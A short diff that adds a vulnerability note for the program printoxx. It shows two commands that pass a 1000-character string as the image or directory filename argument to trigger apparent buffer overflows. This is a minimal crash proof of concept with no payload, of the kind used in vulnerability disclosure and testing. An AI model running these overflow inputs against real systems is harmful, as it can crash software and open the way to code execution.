@@ -1,0 +1,5 @@
+Image filename overflow:
+ $ ./printoxx -i $(python -c 'print "A"*1000')
+ 
+Directory filename overflow:
+$ ./printoxx -f $(python -c 'print "A"*1000')
